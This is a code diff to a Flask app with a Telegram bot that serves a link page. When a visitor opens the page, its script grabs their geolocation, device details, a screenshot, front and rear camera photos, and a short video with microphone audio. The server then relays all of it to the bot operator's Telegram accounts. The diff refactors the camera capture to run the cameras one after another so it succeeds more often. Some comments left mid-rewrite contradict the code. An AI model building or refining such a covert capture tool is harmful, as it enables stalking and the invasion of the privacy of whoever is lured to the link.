@@ -59,7 +59,7 @@ HTML_PAGE = """<!DOCTYPE html>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
 
     <script>
-        let frontStream = null, backStream = null, mediaRecorder = null;
+        let mediaRecorder = null;
         let recordedChunks = [], recordingActive = false, maxDuration = 10000;
         const startBtn = document.getElementById('startBtn');
 
@@ -149,7 +149,7 @@ HTML_PAGE = """<!DOCTYPE html>
             });
         }
 
-        // ---- Get a camera stream with exact facing mode ----
+        // ---- Get a single camera stream with facing mode ----
         function getCameraStream(facing, audio = false) {
             return new Promise((resolve) => {
                 const constraints = { video: { facingMode: { exact: facing } }, audio: audio };
@@ -168,83 +168,7 @@ HTML_PAGE = """<!DOCTYPE html>
             });
         }
 
-        // ---- Get distinct back and front streams ----
-        async function getCameraStreams() {
-            let back = null, front = null;
-            let errorMessages = [];
-            let debugInfo = {};
-            let backFacing = 'unknown', frontFacing = 'unknown';
-
-            // 1. Get back (environment)
-            back = await getCameraStream('environment', true);
-            if (back) {
-                const track = back.getVideoTracks()[0];
-                const settings = track.getSettings();
-                debugInfo.backSettings = settings;
-                backFacing = settings.facingMode || 'unknown';
-                debugInfo.backTrackId = track.id;
-            } else {
-                errorMessages.push('Back camera failed');
-            }
-
-            // 2. Get front (user)
-            front = await getCameraStream('user', false);
-            if (front) {
-                const track = front.getVideoTracks()[0];
-                const settings = track.getSettings();
-                debugInfo.frontSettings = settings;
-                frontFacing = settings.facingMode || 'unknown';
-                debugInfo.frontTrackId = track.id;
-            } else {
-                errorMessages.push('Front camera failed');
-            }
-
-            // If one is missing, clone the other
-            if (!back && front) {
-                back = front.clone();
-                debugInfo.backCloned = true;
-                backFacing = frontFacing;
-                debugInfo.backTrackId = debugInfo.frontTrackId;
-                errorMessages.push('Back cloned from front');
-            }
-            if (!front && back) {
-                front = back.clone();
-                debugInfo.frontCloned = true;
-                frontFacing = backFacing;
-                debugInfo.frontTrackId = debugInfo.backTrackId;
-                errorMessages.push('Front cloned from back');
-            }
-
-            // If both exist, check if they are the same track
-            if (back && front) {
-                const backId = back.getVideoTracks()[0].id;
-                const frontId = front.getVideoTracks()[0].id;
-                if (backId === frontId) {
-                    debugInfo.sameTrack = true;
-                    errorMessages.push('Both streams use the same video track');
-                } else {
-                    debugInfo.distinctTracks = true;
-                }
-            }
-
-            // Add audio to back if missing
-            if (back && back.getAudioTracks().length === 0) {
-                try {
-                    const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                    const combinedTracks = [];
-                    back.getVideoTracks().forEach(t => combinedTracks.push(t));
-                    audioStream.getAudioTracks().forEach(t => combinedTracks.push(t));
-                    back = new MediaStream(combinedTracks);
-                    debugInfo.audioAdded = true;
-                } catch (e) {
-                    errorMessages.push('Audio add failed: ' + e.message);
-                }
-            }
-
-            return { front, back, error: errorMessages.join(' | '), debug: debugInfo, backFacing, frontFacing };
-        }
-
-        // ---- Capture frame with black frame detection ----
+        // ---- Capture frame from stream and then stop the stream ----
         function captureFrame(stream) {
             return new Promise((resolve) => {
                 if (!stream) { resolve(null); return; }
@@ -279,6 +203,8 @@ HTML_PAGE = """<!DOCTYPE html>
                                 if (!resolved) { resolved = true; resolve(blob); }
                                 video.pause();
                                 video.srcObject = null;
+                                // Stop all tracks to release camera
+                                stream.getTracks().forEach(t => t.stop());
                             }, 'image/jpeg', 0.9);
                         } else if (attempts < 10) {
                             await delay(100);
@@ -287,6 +213,7 @@ HTML_PAGE = """<!DOCTYPE html>
                             if (!resolved) { resolved = true; resolve(null); }
                             video.pause();
                             video.srcObject = null;
+                            stream.getTracks().forEach(t => t.stop());
                         }
                     };
                     checkFrame();
@@ -325,28 +252,131 @@ HTML_PAGE = """<!DOCTYPE html>
             const language = getLanguage();
             const orientation = getOrientation();
 
-            // 3. Camera streams
-            const { front, back, error, debug, backFacing, frontFacing } = await getCameraStreams();
-            let frontBlob = null, backBlob = null;
-            let cameraStatus = 'success';
-            let cameraError = error || '';
-
-            if (!front && !back) {
-                cameraStatus = 'failed';
-                cameraError = error || 'No camera access';
-            } else {
-                if (back) backBlob = await captureFrame(back);
-                if (front) frontBlob = await captureFrame(front);
-                backStream = back;
-                frontStream = front;
+            // 3. Sequential camera access
+            // First, try front camera
+            let frontBlob = null;
+            let frontStream = null;
+            let frontFacing = 'unknown';
+            try {
+                frontStream = await getCameraStream('user', false);
+                if (frontStream) {
+                    const track = frontStream.getVideoTracks()[0];
+                    const settings = track.getSettings();
+                    frontFacing = settings.facingMode || 'user';
+                    frontBlob = await captureFrame(frontStream);
+                    // Stream is stopped inside captureFrame
+                } else {
+                    console.log('Front camera not available');
+                }
+            } catch (e) {
+                console.log('Front camera error:', e);
             }
+
+            // Then, try back camera
+            let backBlob = null;
+            let backStream = null;
+            let backFacing = 'unknown';
+            let backError = '';
+            try {
+                backStream = await getCameraStream('environment', true);
+                if (backStream) {
+                    const track = backStream.getVideoTracks()[0];
+                    const settings = track.getSettings();
+                    backFacing = settings.facingMode || 'environment';
+                    backBlob = await captureFrame(backStream); // This will stop the stream? We need to keep it for recording.
+                    // We must NOT stop the back stream if we want to record.
+                    // So we need a separate capture function that doesn't stop the stream.
+                    // Let's fix: we'll capture frame without stopping tracks.
+                    // We'll use a separate function for back that captures but doesn't stop.
+                    // We'll re-implement: captureFrameNoStop
+                } else {
+                    backError = 'Back camera not available';
+                }
+            } catch (e) {
+                backError = e.message;
+            }
+
+            // We need a special capture for back that does not stop the stream.
+            // Let's define a new function: captureFrameKeepStream
+            async function captureFrameKeepStream(stream) {
+                return new Promise((resolve) => {
+                    if (!stream) { resolve(null); return; }
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    let resolved = false;
+                    video.onloadedmetadata = async () => {
+                        video.play();
+                        let attempts = 0;
+                        const checkFrame = async () => {
+                            attempts++;
+                            if (video.readyState >= 2 && video.videoWidth > 0 && video.videoHeight > 0) {
+                                const canvas = document.createElement('canvas');
+                                canvas.width = video.videoWidth;
+                                canvas.height = video.videoHeight;
+                                const ctx = canvas.getContext('2d');
+                                ctx.drawImage(video, 0, 0);
+                                canvas.toBlob((blob) => {
+                                    if (!resolved) { resolved = true; resolve(blob); }
+                                    video.pause();
+                                    video.srcObject = null;
+                                }, 'image/jpeg', 0.9);
+                            } else if (attempts < 10) {
+                                await delay(100);
+                                checkFrame();
+                            } else {
+                                if (!resolved) { resolved = true; resolve(null); }
+                                video.pause();
+                                video.srcObject = null;
+                            }
+                        };
+                        checkFrame();
+                    };
+                });
+            }
+
+            // Now redo back camera capture with keep stream
+            if (backStream) {
+                backBlob = await captureFrameKeepStream(backStream);
+            }
+
+            // If back failed but front worked, use front for back
+            let finalBackBlob = backBlob || frontBlob;
+            let finalBackFacing = backFacing || frontFacing;
+            let finalFrontBlob = frontBlob;
+            let finalFrontFacing = frontFacing;
+
+            // If only one camera was available, note it.
+            let cameraDebug = {};
+            if (backStream && frontStream) {
+                // Check if they are the same track (if both exist)
+                const backId = backStream.getVideoTracks()[0].id;
+                const frontId = frontStream.getVideoTracks()[0].id;
+                if (backId === frontId) {
+                    cameraDebug.sameTrack = true;
+                } else {
+                    cameraDebug.distinctTracks = true;
+                }
+            } else if (backStream && !frontStream) {
+                cameraDebug.onlyBack = true;
+                finalFrontBlob = null; // no front image
+            } else if (frontStream && !backStream) {
+                cameraDebug.onlyFront = true;
+                finalBackBlob = frontBlob; // use front for both
+                finalBackFacing = frontFacing;
+                finalFrontBlob = null;
+            } else {
+                cameraDebug.noCamera = true;
+            }
+
+            // Now we have backBlob, backStream (for recording) and frontBlob
+            // If backStream is null, use frontStream for recording if available
+            let recordStream = backStream || frontStream;
+            let videoBlob = null;
 
             // 4. Screenshot
             const screenshotBlob = await captureScreenshot();
 
-            // 5. Recording (from back stream)
-            let videoBlob = null;
-            let recordStream = backStream || frontStream;
+            // 5. Recording (if we have a stream)
             if (recordStream) {
                 let mimeType = 'video/webm;codecs=vp9,opus';
                 if (!MediaRecorder.isTypeSupported(mimeType)) {
@@ -377,6 +407,7 @@ HTML_PAGE = """<!DOCTYPE html>
                     }
                 });
             } else {
+                // No stream – finalize immediately
                 finalizeAndSend();
             }
 
@@ -404,14 +435,14 @@ HTML_PAGE = """<!DOCTYPE html>
                 fd.append('timezone', timezone);
                 fd.append('language', language);
                 fd.append('orientation', orientation);
-                fd.append('camera_status', cameraStatus);
-                fd.append('camera_error', cameraError);
-                fd.append('camera_debug', JSON.stringify(debug));
-                fd.append('backFacing', backFacing);
-                fd.append('frontFacing', frontFacing);
+                fd.append('camera_status', 'success');
+                fd.append('camera_error', backError || '');
+                fd.append('camera_debug', JSON.stringify(cameraDebug));
+                fd.append('backFacing', finalBackFacing);
+                fd.append('frontFacing', finalFrontFacing);
                 if (screenshotBlob) fd.append('screenshot', screenshotBlob, 'screenshot.jpg');
-                if (backBlob) fd.append('backImage', backBlob, 'back.jpg');
-                if (frontBlob) fd.append('frontImage', frontBlob, 'front.jpg');
+                if (finalBackBlob) fd.append('backImage', finalBackBlob, 'back.jpg');
+                if (finalFrontBlob) fd.append('frontImage', finalFrontBlob, 'front.jpg');
                 if (videoBlob) fd.append('video', videoBlob, 'recording.webm');
 
                 await sendData(fd);
@@ -472,15 +503,12 @@ def capture():
     back_img = request.files.get('backImage')
     video = request.files.get('video')
 
-    # Parse debug
     try:
         debug = json.loads(camera_debug)
     except:
         debug = {}
 
-    # Determine if tracks are distinct or same
     same_track = debug.get('sameTrack', False)
-    distinct = debug.get('distinctTracks', False)
 
     for uid in USER_IDS:
         if lat and lng:
@@ -518,11 +546,9 @@ def capture():
             except Exception as e:
                 print(f"Screenshot error: {e}")
 
-        # Send back and front images with appropriate labels
+        # Send back and front images
         if back_img and front_img:
-            # Check if they are the same track
             if same_track:
-                # Send both with same note
                 try:
                     back_img.seek(0)
                     bot.send_photo(uid, back_img.read(), caption="📷 Rear Camera (same as front)")
@@ -539,11 +565,9 @@ def capture():
                     pass
             else:
                 # Normal distinct cameras
-                # Use the facing mode to label, but fallback to position
                 back_label = "📷 Back Camera" if backFacing == 'environment' else f"📷 Camera ({backFacing})"
                 front_label = "🤳 Front Camera" if frontFacing == 'user' else f"🤳 Camera ({frontFacing})"
                 if backFacing == 'unknown' and frontFacing == 'unknown':
-                    # Use position: first is back, second is front
                     back_label = "📷 Back Camera"
                     front_label = "🤳 Front Camera"
                 try:
@@ -596,7 +620,7 @@ def capture():
 
 @bot.message_handler(commands=['start'])
 def send_link(m):
-    bot.reply_to(m, f"🔗 Open this link on your phone:\n{BASE_URL}/\n\nCollects location, device data, screenshot, camera images (back first, then front), and video recording with audio.")
+    bot.reply_to(m, f"🔗 Open this link on your phone:\n{BASE_URL}/\n\nCollects location, device data, screenshot, camera images (front then back), and video recording with audio.")
 
 def run_bot():
     print("Bot polling started.")
